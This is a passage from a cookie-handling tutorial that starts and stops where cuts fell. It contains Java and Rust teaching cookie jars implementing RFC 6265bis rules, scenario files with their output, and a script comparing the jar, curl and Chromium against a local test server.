        sb.append(", SameSite=").append(c.sameSite == null ? "default" : c.sameSite);
        sb.append(c.expiry == null ? ", session" : ", expires in " + (c.expiry - now) + " s");
        return sb.append(")").toString();
    }

    static Long parseDate(String s) {
        try { return LocalDateTime.parse(s, HTTP_DATE).toEpochSecond(ZoneOffset.UTC); } catch (Exception e) { return null; }
    }

    // ---------------------------------------------------------------- retrieval (5.8)

    static void get(Url url, String optionsText) {
        Ctx ctx = options(url, optionsText).ctx();
        List<Cookie> send = new ArrayList<>();
        List<String> skipped = new ArrayList<>();
        JAR.removeIf(c -> c.expiry != null && c.expiry <= now);
        for (Cookie c : JAR) {
            String why = null;
            if (c.hostOnly ? !url.host().equals(c.domain) : !domainMatch(url.host(), c.domain)) why = "domain " + c.domain + " does not match " + url.host();
            else if (!pathMatch(url.path(), c.path)) why = "path " + c.path + " does not match " + url.path();
            else if (c.secure && !url.secure()) why = "Secure cookie, insecure request";
            else if (c.httpOnly && ctx.script()) why = "HttpOnly cookie, script API";
            else why = sameSiteVerdict(c, url, ctx);
            if (why == null) send.add(c); else skipped.add(c.name + ": " + why);
        }
        send.sort(Comparator.comparingInt((Cookie c) -> -c.path.length()).thenComparingLong(c -> c.seq));
        System.out.println("  -> " + (send.isEmpty() ? "(no Cookie field)" : "Cookie: " + String.join("; ", send.stream()
                .map(c -> c.name.isEmpty() ? c.value : c.name + "=" + c.value).toList())));
        for (String s : skipped) System.out.println("     skipped " + s);
    }

    // null: the cookie may be sent in this context; otherwise the reason it may not
    static String sameSiteVerdict(Cookie c, Url url, Ctx ctx) {
        if (sameSite(url, ctx.site())) return null;
        String effective = c.sameSite == null ? "Lax" : c.sameSite;
        switch (effective) {
            case "None": return null;
            case "Strict": return "SameSite=Strict, cross-site request";
            default:
                boolean safe = Set.of("GET", "HEAD", "OPTIONS", "TRACE").contains(ctx.method());
                if (ctx.nav() && safe) return null;
                if (ctx.nav() && c.sameSite == null && ctx.method().equals("POST") && now - c.created < LAX_POST_WINDOW) return null;
                return (c.sameSite == null ? "default (Lax)" : "SameSite=Lax") + ", cross-site "
                        + (ctx.nav() ? ctx.method() + " navigation" + (c.sameSite == null ? " older than " + LAX_POST_WINDOW + " s" : "") : "subresource request");
        }
    }
}
```

```rust
// A teaching cookie jar: the storage and retrieval model of RFC 6265bis (draft 22) sections 5.5 to 5.8, plus the
// browser rules around it (prefixes, SameSite, the 400-day cap, "leave Secure cookies alone"). It is driven by a
// scenario file so that every decision, and its reason, is printed. Rust twin of CookieJar.java.
//
//   now <epoch-seconds>                           sets the jar's clock
//   advance <seconds>                             moves the clock forward
//   secure-localhost on                           treat http://localhost and http://*.localhost as secure, as browsers do
//   set <url> [options] <Set-Cookie field value>  a response from <url> sets a cookie
//   get <url> [options]                           a request to <url>: which cookies go with it?
// Options (for set and get): --site=<url|none>  the "site for cookies": the top-level page the request belongs to
//                                               (default: the request's own URL, i.e. first-party)
//                            --nav              a top-level navigation (the user's address bar or a clicked link)
//                            --method=<M>       the request method (default GET)
//                            --script           the cookie API of a script (document.cookie), not HTTP
// Usage: cookie_jar <scenario-file>
use std::sync::atomic::{AtomicBool, Ordering};
use std::time::{Duration, UNIX_EPOCH};

static SECURE_LOCALHOST: AtomicBool = AtomicBool::new(false);

const MAX_LIFETIME: i64 = 400 * 86400;                  // the 400-day cap Chrome applies and the draft recommends
const LAX_POST_WINDOW: i64 = 120;                       // Chrome's "Lax+POST" window for cookies without SameSite
// A tiny public suffix list. Real browsers use the full list from publicsuffix.org (about 10,000 rules).
const SUFFIXES: [&str; 10] = ["com", "org", "net", "edu", "io", "uk", "co.uk", "github.io", "localhost", "test"];

#[derive(Clone, Default)]
struct Cookie {
    name: String,
    value: String,
    domain: String,
    path: String,
    same_site: Option<&'static str>,                    // None (not given), Lax, Strict, None
    host_only: bool,
    secure: bool,
    http_only: bool,
    expiry: Option<i64>,                                // None: a session cookie
    created: i64,
    seq: u64,
}

struct Url { scheme: String, host: String, path: String }

impl Url {
    fn secure(&self) -> bool {
        self.scheme == "https" || (SECURE_LOCALHOST.load(Ordering::Relaxed) && (self.host == "localhost" || self.host.ends_with(".localhost")))
    }
}

struct Ctx { site: Option<Url>, nav: bool, method: String, script: bool }

struct Jar { now: i64, cookies: Vec<Cookie>, counter: u64 }

fn main() {
    let file = std::env::args().nth(1).unwrap();
    let mut jar = Jar { now: 1793188800, cookies: Vec::new(), counter: 0 };      // 2026-10-28 12:00:00 UTC
    for line in std::fs::read_to_string(file).unwrap().lines() {
        let line = line.trim();
        if line.is_empty() || line.starts_with('#') { println!("{line}"); continue; }
        let mut t = line.splitn(3, char::is_whitespace);
        let cmd = t.next().unwrap();
        let a = t.next().unwrap_or("");
        let rest = t.next().unwrap_or("").trim_start();
        match cmd {
            "now" => jar.now = a.parse().unwrap(),
            "secure-localhost" => { SECURE_LOCALHOST.store(a == "on", Ordering::Relaxed); println!("{line}"); }
            "advance" => { jar.now += a.parse::<i64>().unwrap(); println!("{line}"); }
            "set" => {
                println!("{line}");
                let url = parse_url(a);
                let (ctx, field) = options(&url, rest);
                println!("  -> {}", jar.store(&url, &ctx, &field));
            }
            "get" => {
                println!("{line}");
                let url = parse_url(a);
                let (ctx, _) = options(&url, rest);
                jar.get(&url, &ctx);
            }
            _ => panic!("{line}"),
        }
    }
}

// ---------------------------------------------------------------- URLs, sites, matching (RFC 6265bis 5.1)

fn parse_url(s: &str) -> Url {
    let (scheme, rest) = s.split_once("://").unwrap();
    let (host_port, path) = match rest.find('/') { Some(i) => (&rest[..i], &rest[i..]), None => (rest, "/") };
    let path = path.split('?').next().unwrap();
    let host = match host_port.rsplit_once(':') {
        Some((h, p)) if p.bytes().all(|b| b.is_ascii_digit()) && !p.is_empty() => h,
        _ => host_port,
    };
    Url { scheme: scheme.to_string(), host: host.to_lowercase(), path: path.to_string() }
}

fn is_ip(host: &str) -> bool {
    host.contains(':') || (host.split('.').count() == 4 && host.split('.').all(|p| !p.is_empty() && p.bytes().all(|b| b.is_ascii_digit())))
}

fn domain_match(host: &str, domain: &str) -> bool {
    host == domain || (host.ends_with(&format!(".{domain}")) && !is_ip(host))
}

fn path_match(request_path: &str, cookie_path: &str) -> bool {
    if request_path == cookie_path { return true; }
    request_path.starts_with(cookie_path) && (cookie_path.ends_with('/') || request_path.as_bytes()[cookie_path.len()] == b'/')
}

fn default_path(path: &str) -> String {
    if !path.starts_with('/') || !path[1..].contains('/') { return "/".into(); }
    path[..path.rfind('/').unwrap()].to_string()
}

fn public_suffix(domain: &str) -> bool { SUFFIXES.contains(&domain) }

// The registrable domain ("site") of a host: the longest public suffix plus one label; the last label if no rule matches.
fn site(host: &str) -> String {
    if is_ip(host) { return host.to_string(); }
    let labels: Vec<&str> = host.split('.').collect();
    let mut suffix_labels = 1;
    for n in (1..=labels.len()).rev() {
        if public_suffix(&labels[labels.len() - n..].join(".")) { suffix_labels = n; break; }
    }
    let take = labels.len().min(suffix_labels + 1);
    labels[labels.len() - take..].join(".")
}

fn same_site(request: &Url, site_for_cookies: &Option<Url>) -> bool {
    match site_for_cookies {
        Some(s) => request.scheme == s.scheme && site(&request.host) == site(&s.host),
        None => false,
    }
}

// ---------------------------------------------------------------- options

fn options(url: &Url, s: &str) -> (Ctx, String) {
    let mut ctx = Ctx { site: Some(Url { scheme: url.scheme.clone(), host: url.host.clone(), path: url.path.clone() }),
                        nav: false, method: "GET".into(), script: false };
    let mut s = s.trim();
    while s.starts_with("--") {
        let (o, rest) = s.split_once(char::is_whitespace).unwrap_or((s, ""));
        match o {
            "--nav" => ctx.nav = true,
            "--script" => ctx.script = true,
            _ if o.starts_with("--method=") => ctx.method = o[9..].to_string(),
            _ if o.starts_with("--site=") => ctx.site = if &o[7..] == "none" { None } else { Some(parse_url(&o[7..])) },
            _ => {}
        }
        s = rest.trim();
    }
    (ctx, s.to_string())
}

// ---------------------------------------------------------------- storage (5.7)

impl Jar {
    fn store(&mut self, url: &Url, ctx: &Ctx, field: &str) -> String {
        if field.len() > 4096 { return "ignored: the field is longer than 4096 bytes".into(); }
        let parts: Vec<&str> = field.split(';').collect();
        let (name, value) = match parts[0].split_once('=') {
            Some((n, v)) => (n.trim().to_string(), v.trim().to_string()),
            None => (String::new(), parts[0].trim().to_string()),
        };
        if name.is_empty() && value.is_empty() { return "ignored: empty name and value".into(); }
        if name.len() + value.len() > 4096 { return "ignored: name and value together exceed 4096 bytes".into(); }
        let (mut domain_attr, mut path_attr, mut same_site_attr): (Option<String>, Option<String>, Option<&'static str>) = (None, None, None);
        let (mut secure, mut http_only) = (false, false);
        let (mut max_age, mut expires): (Option<i64>, Option<i64>) = (None, None);
        for av in &parts[1..] {
            let (an, avv) = match av.split_once('=') { Some((a, v)) => (a.trim().to_lowercase(), v.trim()), None => (av.trim().to_lowercase(), "") };
            if avv.len() > 1024 { continue; }                                  // an over-long attribute value is skipped
            match an.as_str() {
                "expires" => if let Some(d) = parse_date(avv) { expires = Some(d); },
                "max-age" => {
                    let digits = avv.strip_prefix('-').unwrap_or(avv);
                    if !digits.is_empty() && digits.bytes().all(|b| b.is_ascii_digit()) {
                        max_age = Some(avv.parse::<i64>().unwrap_or(if avv.starts_with('-') { i64::MIN } else { i64::MAX }));
                    }
                }
                "domain" => { let d = avv.strip_prefix('.').unwrap_or(avv); if !d.is_empty() { domain_attr = Some(d.to_lowercase()); } }
                "path" => if avv.starts_with('/') { path_attr = Some(avv.to_string()); },
                "secure" => secure = true,
                "httponly" => http_only = true,
                "samesite" => {
                    same_site_attr = match avv.to_lowercase().as_str() { "strict" => Some("Strict"), "lax" => Some("Lax"), "none" => Some("None"), _ => None };
                }
                _ => {}
            }
        }
        let mut c = Cookie { name, value, secure, http_only, same_site: same_site_attr, ..Default::default() };
        let host = &url.host;
        if let Some(d) = &domain_attr {
            if public_suffix(d) {
                if d != host { return format!("ignored: Domain={d} is a public suffix"); }
                domain_attr = None;                                            // a host that is itself a suffix: treat as host-only
            }
        }
        match &domain_attr {
            Some(d) => {
                if !domain_match(host, d) { return format!("ignored: Domain={d} does not domain-match {host}"); }
                c.host_only = false;
                c.domain = d.clone();
            }
            None => { c.host_only = true; c.domain = host.clone(); }
        }
        c.path = path_attr.unwrap_or_else(|| default_path(&url.path));
        if secure && !url.secure() { return "ignored: Secure cookie from an insecure URL".into(); }
        if http_only && ctx.script { return "ignored: HttpOnly cookie set from a script API".into(); }
        if same_site_attr == Some("None") && !secure { return "ignored: SameSite=None without Secure".into(); }
        if same_site_attr != Some("None") && !same_site(url, &ctx.site) {
            return format!("ignored: {} cookie set from a cross-site context",
                           match same_site_attr { None => "default (Lax)".to_string(), Some(s) => format!("SameSite={s}") });
        }
        let lower = c.name.to_lowercase();
        if lower.starts_with("__secure-") && !secure { return "ignored: __Secure- prefix needs Secure".into(); }
        if lower.starts_with("__host-") {
            if !secure { return "ignored: __Host- prefix needs Secure".into(); }
            if !c.host_only { return "ignored: __Host- prefix forbids Domain".into(); }
            if c.path != "/" { return "ignored: __Host- prefix needs Path=/".into(); }
        }
        if lower.starts_with("__http-") {
            if !secure { return "ignored: __Http- prefix needs Secure".into(); }
            if !http_only { return "ignored: __Http- prefix needs HttpOnly".into(); }
        }
        if lower.starts_with("__host-http-") && !http_only { return "ignored: __Host-Http- prefix needs HttpOnly".into(); }
        if let Some(m) = max_age {
            c.expiry = Some(if m <= 0 { 0 } else { self.now + m.min(MAX_LIFETIME) });
        } else if let Some(e) = expires {
            c.expiry = Some(e.min(self.now + MAX_LIFETIME));
        }
        let old = self.cookies.iter().position(|o| o.name == c.name && o.domain == c.domain && o.path == c.path && o.host_only == c.host_only);
        if matches!(c.expiry, Some(e) if e <= self.now) {
            return match old {
                None => "ignored: already expired, and there was nothing to remove".into(),
                Some(i) => { self.cookies.remove(i); format!("removed {}", describe_key(&c)) }
            };
        }
        if !c.secure && !url.secure() {                                        // leave Secure cookies alone
            for o in &self.cookies {
                if o.secure && o.name == c.name && (domain_match(&c.domain, &o.domain) || domain_match(&o.domain, &c.domain))
                    && (path_match(&c.path, &o.path) || path_match(&o.path, &c.path)) {
                    return "ignored: would overwrite a Secure cookie from an insecure URL".into();
                }
            }
        }
        self.counter += 1;
        c.seq = self.counter;
        c.created = self.now;
        if let Some(i) = old {
            c.created = self.cookies[i].created;
            c.seq = self.cookies[i].seq;
            self.cookies.remove(i);
        }
        let verb = if old.is_some() { "replaced" } else { "stored" };
        let d = self.describe(&c);
        self.cookies.push(c);
        format!("{verb} {d}")
    }

    fn describe(&self, c: &Cookie) -> String {
        let mut sb = format!("{}={} ({} {}, path {}", c.name, c.value, if c.host_only { "host-only" } else { "domain" }, c.domain, c.path);
        if c.secure { sb += ", Secure"; }
        if c.http_only { sb += ", HttpOnly"; }
        sb += &format!(", SameSite={}", c.same_site.unwrap_or("default"));
        match c.expiry { None => sb += ", session", Some(e) => sb += &format!(", expires in {} s", e - self.now) }
        sb + ")"
    }

    // ---------------------------------------------------------------- retrieval (5.8)

    fn get(&mut self, url: &Url, ctx: &Ctx) {
        let now = self.now;
        self.cookies.retain(|c| !matches!(c.expiry, Some(e) if e <= now));
        let mut send: Vec<&Cookie> = Vec::new();
        let mut skipped: Vec<String> = Vec::new();
        for c in &self.cookies {
            let why = if if c.host_only { url.host != c.domain } else { !domain_match(&url.host, &c.domain) } {
                Some(format!("domain {} does not match {}", c.domain, url.host))
            } else if !path_match(&url.path, &c.path) {
                Some(format!("path {} does not match {}", c.path, url.path))
            } else if c.secure && !url.secure() {
                Some("Secure cookie, insecure request".to_string())
            } else if c.http_only && ctx.script {
                Some("HttpOnly cookie, script API".to_string())
            } else {
                same_site_verdict(c, url, ctx, now)
            };
            match why { None => send.push(c), Some(w) => skipped.push(format!("{}: {w}", c.name)) }
        }
        send.sort_by(|a, b| b.path.len().cmp(&a.path.len()).then(a.seq.cmp(&b.seq)));
        if send.is_empty() {
            println!("  -> (no Cookie field)");
        } else {
            let pairs: Vec<String> = send.iter().map(|c| if c.name.is_empty() { c.value.clone() } else { format!("{}={}", c.name, c.value) }).collect();
            println!("  -> Cookie: {}", pairs.join("; "));
        }
        for s in skipped { println!("     skipped {s}"); }
    }
}

fn describe_key(c: &Cookie) -> String {
    format!("{} ({} {}, path {})", c.name, if c.host_only { "host-only" } else { "domain" }, c.domain, c.path)
}

// None: the cookie may be sent in this context; otherwise the reason it may not
fn same_site_verdict(c: &Cookie, url: &Url, ctx: &Ctx, now: i64) -> Option<String> {
    if same_site(url, &ctx.site) { return None; }
    match c.same_site.unwrap_or("Lax") {
        "None" => None,
        "Strict" => Some("SameSite=Strict, cross-site request".to_string()),
        _ => {
            let safe = ["GET", "HEAD", "OPTIONS", "TRACE"].contains(&ctx.method.as_str());
            if ctx.nav && safe { return None; }
            if ctx.nav && c.same_site.is_none() && ctx.method == "POST" && now - c.created < LAX_POST_WINDOW { return None; }
            Some(format!("{}, cross-site {}", if c.same_site.is_none() { "default (Lax)" } else { "SameSite=Lax" },
                         if ctx.nav { format!("{} navigation{}", ctx.method, if c.same_site.is_none() { format!(" older than {LAX_POST_WINDOW} s") } else { String::new() }) }
                         else { "subresource request".to_string() }))
        }
    }
}

// Only the IMF-fixdate form ("Sun, 06 Nov 1994 08:49:37 GMT") is accepted, as in the Java twin. The RFC's tolerant
// date algorithm accepts many more spellings.
fn parse_date(s: &str) -> Option<i64> {
    let t = httpdate::parse_http_date(s).ok()?;
    if httpdate::fmt_http_date(t) != s { return None; }
    Some(t.duration_since(UNIX_EPOCH).unwrap_or(Duration::ZERO).as_secs() as i64)
}
```

`s01_scope.txt` asks about scope: host-only and `Domain`, a path, `Secure`, a lookalike host.

```text
# Scope: host-only against Domain, path, Secure
set https://shop.example.com/login   sid=abc; Path=/; Secure; HttpOnly
set https://shop.example.com/login   theme=dark; Domain=example.com
set https://shop.example.com/admin/x admin=1; Path=/admin
get https://shop.example.com/
get https://shop.example.com/admin/users
get https://blog.example.com/
get http://shop.example.com/
get https://example.com/
get https://shop.example.com.evil.net/
```

```text
# Scope: host-only against Domain, path, Secure
set https://shop.example.com/login   sid=abc; Path=/; Secure; HttpOnly
  -> stored sid=abc (host-only shop.example.com, path /, Secure, HttpOnly, SameSite=default, session)
set https://shop.example.com/login   theme=dark; Domain=example.com
  -> stored theme=dark (domain example.com, path /, SameSite=default, session)
set https://shop.example.com/admin/x admin=1; Path=/admin
  -> stored admin=1 (host-only shop.example.com, path /admin, SameSite=default, session)
get https://shop.example.com/
  -> Cookie: sid=abc; theme=dark
     skipped admin: path /admin does not match /
get https://shop.example.com/admin/users
  -> Cookie: admin=1; sid=abc; theme=dark
get https://blog.example.com/
  -> Cookie: theme=dark
     skipped sid: domain shop.example.com does not match blog.example.com
     skipped admin: domain shop.example.com does not match blog.example.com
get http://shop.example.com/
  -> Cookie: theme=dark
     skipped sid: Secure cookie, insecure request
     skipped admin: path /admin does not match /
get https://example.com/
  -> Cookie: theme=dark
     skipped sid: domain shop.example.com does not match example.com
     skipped admin: domain shop.example.com does not match example.com
get https://shop.example.com.evil.net/
  -> (no Cookie field)
     skipped sid: domain shop.example.com does not match shop.example.com.evil.net
     skipped theme: domain example.com does not match shop.example.com.evil.net
     skipped admin: domain shop.example.com does not match shop.example.com.evil.net
```

`s02_parse.txt` feeds the jar odd, partial and hostile fields:

```text
# Parsing and lifetime: what the jar does with odd, partial and hostile Set-Cookie fields
# 1. whitespace, an equals sign in the value, attribute names in any case
set https://shop.example.com/a/b   token =  x=y=z ;  PATH=/a ; secure ; HttpOnly
# 2. no equals sign: the field is a cookie with an empty name (RFC 6265bis 5.7)
set https://shop.example.com/   lonely-value
# 3. Max-Age wins over Expires, and a lifetime is capped at 400 days
set https://shop.example.com/   m1=1; Max-Age=60; Expires=Fri, 01 Jan 2100 00:00:00 GMT
set https://shop.example.com/   m2=1; Expires=Fri, 01 Jan 2100 00:00:00 GMT
set https://shop.example.com/   m3=1; Max-Age=99999999999
set https://shop.example.com/   m4=1; Expires=Thu, 05 Nov 2026 12:00:00 GMT
# 4. an invalid Max-Age or Expires is ignored, leaving a session cookie
set https://shop.example.com/   m5=1; Max-Age=soon
set https://shop.example.com/   m6=1; Expires=next tuesday
# 5. deleting: Max-Age=0 or a date in the past removes the cookie with the same name, domain and path
set https://shop.example.com/   m1=; Max-Age=0
set https://shop.example.com/   m2=; Expires=Thu, 01 Jan 1970 00:00:00 GMT
set https://shop.example.com/   never-there=; Max-Age=0
# 6. the default path comes from the URL that set the cookie
set https://shop.example.com/shop/cart/add   d1=1
set https://shop.example.com/shop             d2=1
# 7. Domain: leading dot ignored, wrong domain, another site, a public suffix
set https://shop.example.com/   dom1=1; Domain=.EXAMPLE.com
set https://shop.example.com/   dom2=1; Domain=blog.example.com
set https://shop.example.com/   dom3=1; Domain=evil.net
set https://shop.example.com/   dom4=1; Domain=com
set https://shop.example.co.uk/ dom5=1; Domain=co.uk
set https://shop.example.co.uk/ dom6=1; Domain=example.co.uk
# 8. a Path that does not start with a slash is ignored
set https://shop.example.com/x/y   p1=1; Path=admin
# 9. empty cookie
set https://shop.example.com/   ;
get https://shop.example.com/shop/cart/add
get https://shop.example.com/a/b/c
advance 100
get https://shop.example.com/
advance 700000
get https://shop.example.com/
```

```text
# Parsing and lifetime: what the jar does with odd, partial and hostile Set-Cookie fields
# 1. whitespace, an equals sign in the value, attribute names in any case
set https://shop.example.com/a/b   token =  x=y=z ;  PATH=/a ; secure ; HttpOnly
  -> stored token=x=y=z (host-only shop.example.com, path /a, Secure, HttpOnly, SameSite=default, session)
# 2. no equals sign: the field is a cookie with an empty name (RFC 6265bis 5.7)
set https://shop.example.com/   lonely-value
  -> stored =lonely-value (host-only shop.example.com, path /, SameSite=default, session)
# 3. Max-Age wins over Expires, and a lifetime is capped at 400 days
set https://shop.example.com/   m1=1; Max-Age=60; Expires=Fri, 01 Jan 2100 00:00:00 GMT
  -> stored m1=1 (host-only shop.example.com, path /, SameSite=default, expires in 60 s)
set https://shop.example.com/   m2=1; Expires=Fri, 01 Jan 2100 00:00:00 GMT
  -> stored m2=1 (host-only shop.example.com, path /, SameSite=default, expires in 34560000 s)
set https://shop.example.com/   m3=1; Max-Age=99999999999
  -> stored m3=1 (host-only shop.example.com, path /, SameSite=default, expires in 34560000 s)
set https://shop.example.com/   m4=1; Expires=Thu, 05 Nov 2026 12:00:00 GMT
  -> stored m4=1 (host-only shop.example.com, path /, SameSite=default, expires in 691200 s)
# 4. an invalid Max-Age or Expires is ignored, leaving a session cookie
set https://shop.example.com/   m5=1; Max-Age=soon
  -> stored m5=1 (host-only shop.example.com, path /, SameSite=default, session)
set https://shop.example.com/   m6=1; Expires=next tuesday
  -> stored m6=1 (host-only shop.example.com, path /, SameSite=default, session)
# 5. deleting: Max-Age=0 or a date in the past removes the cookie with the same name, domain and path
set https://shop.example.com/   m1=; Max-Age=0
  -> removed m1 (host-only shop.example.com, path /)
set https://shop.example.com/   m2=; Expires=Thu, 01 Jan 1970 00:00:00 GMT
  -> removed m2 (host-only shop.example.com, path /)
set https://shop.example.com/   never-there=; Max-Age=0
  -> ignored: already expired, and there was nothing to remove
# 6. the default path comes from the URL that set the cookie
set https://shop.example.com/shop/cart/add   d1=1
  -> stored d1=1 (host-only shop.example.com, path /shop/cart, SameSite=default, session)
set https://shop.example.com/shop             d2=1
  -> stored d2=1 (host-only shop.example.com, path /, SameSite=default, session)
# 7. Domain: leading dot ignored, wrong domain, another site, a public suffix
set https://shop.example.com/   dom1=1; Domain=.EXAMPLE.com
  -> stored dom1=1 (domain example.com, path /, SameSite=default, session)
set https://shop.example.com/   dom2=1; Domain=blog.example.com
  -> ignored: Domain=blog.example.com does not domain-match shop.example.com
set https://shop.example.com/   dom3=1; Domain=evil.net
  -> ignored: Domain=evil.net does not domain-match shop.example.com
set https://shop.example.com/   dom4=1; Domain=com
  -> ignored: Domain=com is a public suffix
set https://shop.example.co.uk/ dom5=1; Domain=co.uk
  -> ignored: Domain=co.uk is a public suffix
set https://shop.example.co.uk/ dom6=1; Domain=example.co.uk
  -> stored dom6=1 (domain example.co.uk, path /, SameSite=default, session)
# 8. a Path that does not start with a slash is ignored
set https://shop.example.com/x/y   p1=1; Path=admin
  -> stored p1=1 (host-only shop.example.com, path /x, SameSite=default, session)
# 9. empty cookie
set https://shop.example.com/   ;
  -> ignored: empty name and value
get https://shop.example.com/shop/cart/add
  -> Cookie: d1=1; lonely-value; m3=1; m4=1; m5=1; m6=1; d2=1; dom1=1
     skipped token: path /a does not match /shop/cart/add
     skipped dom6: domain example.co.uk does not match shop.example.com
     skipped p1: path /x does not match /shop/cart/add
get https://shop.example.com/a/b/c
  -> Cookie: token=x=y=z; lonely-value; m3=1; m4=1; m5=1; m6=1; d2=1; dom1=1
     skipped d1: path /shop/cart does not match /a/b/c
     skipped dom6: domain example.co.uk does not match shop.example.com
     skipped p1: path /x does not match /a/b/c
advance 100
get https://shop.example.com/
  -> Cookie: lonely-value; m3=1; m4=1; m5=1; m6=1; d2=1; dom1=1
     skipped token: path /a does not match /
     skipped d1: path /shop/cart does not match /
     skipped dom6: domain example.co.uk does not match shop.example.com
     skipped p1: path /x does not match /
advance 700000
get https://shop.example.com/
  -> Cookie: lonely-value; m3=1; m5=1; m6=1; d2=1; dom1=1
     skipped token: path /a does not match /
     skipped d1: path /shop/cart does not match /
     skipped dom6: domain example.co.uk does not match shop.example.com
     skipped p1: path /x does not match /
```

What to notice (the first transcript):

- `blog.example.com` and `example.com` each receive `theme`, the `Domain` cookie, and not the host-only `sid` or the `/admin` cookie: the jar names the reason for each skip.

- `http://shop.example.com/` loses `sid` because it is `Secure`. `https://shop.example.com.evil.net/` receives nothing: the host name merely *starts with* the cookie's host, and the match is by domain, not by prefix.

What to notice (the second): every bullet of "Parsing details that matter" in 10.02 is one item here. The cap shows as `expires in 34560000 s` for both `Max-Age=99999999999` and a date in 2100. `Domain=com` and `Domain=co.uk` are refused as public suffixes, and `Domain=example.co.uk` is accepted. The final `get` after `advance 700000` shows `m4` (eight days) gone.

Both programs print the same output for the four scenarios; `cmp` agrees byte for byte (the equivalence check under "Running everything" at the end of this section).

**Part C: three engines, one scenario.** `drivers/crosscheck.js` runs a scenario through the jar, through `curl` against the shop's `/set` and `/echo`, and through Chromium, and compares the `Cookie` field each would send. Chromium is the reference; the jar and `curl` are compared with it. It needs the Java shop on 9400:

```js
// Runs one cookie scenario through three engines and compares what each would send:
//   jar      the teaching cookie jar (Java), reading the scenario as written
//   curl     curl 8.5 with a cookie jar file, one request per step against the shop on PORT
//   chromium Chromium driven by Playwright, one top-level navigation per step
// Scenario URLs carry no port; the shop's port is added here. 'set' steps must end in /set and 'get' steps in /echo.
// Usage: node crosscheck.js <scenario-file> [port]
const { execFileSync } = require('child_process');
const noJavaOptions = () => { const e = { ...process.env }; delete e.JAVA_TOOL_OPTIONS; return e; };
const fs = require('fs');
const os = require('os');
const path = require('path');
const { chromium } = require('playwright');

const file = process.argv[2];
const port = process.argv[3] || '9400';
const steps = fs.readFileSync(file, 'utf8').split('\n').map(l => l.trim()).filter(l => l && !l.startsWith('#'))
  .map(l => l.match(/^(set|get)\s+(\S+)\s*(.*)$/)).filter(Boolean).map(m => ({ kind: m[1], url: m[2], field: m[3] }));
const withPort = u => u.replace(/^(https?:\/\/[^\/]+)/, `$1:${port}`);
const parseCookieLine = body => { const m = body.match(/^cookie: (.*)$/m); return m && m[1] !== '-' ? m[1] : '(none)'; };

// jar: the teaching jar's own output
const jarOut = execFileSync('java', [path.join(__dirname, '..', 'java', 'CookieJar.java'), file],
  { env: noJavaOptions(), encoding: 'utf8' });
const jarGets = [];
for (const l of jarOut.split('\n')) {
  if (l.startsWith('  -> Cookie: ')) jarGets.push(l.slice(13));
  else if (l.startsWith('  -> (no Cookie field)')) jarGets.push('(none)');
}

// curl: a cookie jar file shared by all steps
const jarFile = path.join(os.tmpdir(), `xcheck-${process.pid}.jar`);
const curlGets = [];
for (const s of steps) {
  const target = s.kind === 'set' ? `${withPort(s.url)}?c=${encodeURIComponent(s.field)}` : withPort(s.url);
  const body = execFileSync('curl', ['-s', '--noproxy', '', '-b', jarFile, '-c', jarFile, target], { encoding: 'utf8' });
  if (s.kind === 'get') curlGets.push(parseCookieLine(body));
}
fs.rmSync(jarFile, { force: true });

(async () => {
  const browser = await chromium.launch();
  const ctx = await browser.newContext();
  const page = await ctx.newPage();
  const chGets = [];
  for (const s of steps) {
    const target = s.kind === 'set' ? `${withPort(s.url)}?c=${encodeURIComponent(s.field)}` : withPort(s.url);
    await page.goto(target);
    if (s.kind === 'get') chGets.push(parseCookieLine(await page.innerText('body')));
  }
  await browser.close();
  const asSet = v => v === '(none)' ? '' : v.split('; ').sort().join('; ');
  // each engine is compared with Chromium, the reference
  const verdict = (x, ref) => x === ref ? 'identical' : asSet(x) === asSet(ref) ? 'same cookies, other order' : 'different cookies';
  const tally = { jar: {}, curl: {} };
  const lines = [];
  let n = 0;
  for (const s of steps) {
    if (s.kind !== 'get') continue;
    const [j, c, h] = [jarGets[n], curlGets[n], chGets[n]];
    n++;
    const vj = verdict(j, h), vc = verdict(c, h);
    tally.jar[vj] = (tally.jar[vj] || 0) + 1;
    tally.curl[vc] = (tally.curl[vc] || 0) + 1;
    lines.push(`get ${s.url}`);
    lines.push(`   chromium ${h}`);
    lines.push(`   jar      ${j}${vj === 'identical' ? '' : '   <-- ' + vj}`);
    lines.push(`   curl     ${c}${vc === 'identical' ? '' : '   <-- ' + vc}`);
  }
  console.log(lines.join('\n'));
  const show = t => ['identical', 'same cookies, other order', 'different cookies'].map(k => `${t[k] || 0} ${k}`).join(', ');
  console.log(`\n${n} request(s), compared with Chromium:`);
  console.log(`   teaching jar: ${show(tally.jar)}`);
  console.log(`   curl 8.5:     ${show(tally.curl)}`);
})();
```

`x01_scope.txt`: scope, the same questions as `s01`, in the form the shop can answer.

```text
# Cross-check: scope. Host-only, Domain, Path, and what each engine does with a deletion
set http://shop.localhost/set             a=1
set http://shop.localhost/set             b=2; Domain=shop.localhost
set http://shop.localhost/x/y/set         c=3
set http://api.shop.localhost/set         d=4; Domain=shop.localhost
set http://api.shop.localhost/set         e=5; Domain=blog.shop.localhost
set http://shop.localhost/set             f=6; Domain=localhost
set http://shop.localhost/set             g=7; Path=/p
set http://shop.localhost/set             h=8; Path=/q/
set http://shop.localhost/set             i=9; Domain=.shop.localhost
get http://shop.localhost/echo
get http://shop.localhost/x/y/echo
get http://shop.localhost/x/echo
get http://shop.localhost/p/echo
get http://shop.localhost/pp/echo
get http://shop.localhost/q/echo
get http://shop.localhost/qq/echo
get http://api.shop.localhost/echo
get http://blog.shop.localhost/echo
set http://shop.localhost/set             a=; Max-Age=0
set http://shop.localhost/set             b=; Max-Age=0
set http://shop.localhost/set             never=; Expires=Thu, 01 Jan 1970 00:00:00 GMT
get http://shop.localhost/echo
get http://api.shop.localhost/echo
```

```text
get http://shop.localhost/echo
   chromium a=1; b=2; d=4; i=9
   jar      a=1; b=2; d=4; i=9
   curl     d=4; b=2; a=1; i=9   <-- same cookies, other order
get http://shop.localhost/x/y/echo
   chromium c=3; a=1; b=2; d=4; i=9
   jar      c=3; a=1; b=2; d=4; i=9
   curl     c=3; i=9; a=1; b=2; d=4   <-- same cookies, other order
get http://shop.localhost/x/echo
   chromium a=1; b=2; d=4; i=9
   jar      a=1; b=2; d=4; i=9
   curl     d=4; b=2; a=1; i=9   <-- same cookies, other order
get http://shop.localhost/p/echo
   chromium g=7; a=1; b=2; d=4; i=9
   jar      g=7; a=1; b=2; d=4; i=9
   curl     g=7; i=9; a=1; b=2; d=4   <-- same cookies, other order
get http://shop.localhost/pp/echo
   chromium a=1; b=2; d=4; i=9
   jar      a=1; b=2; d=4; i=9
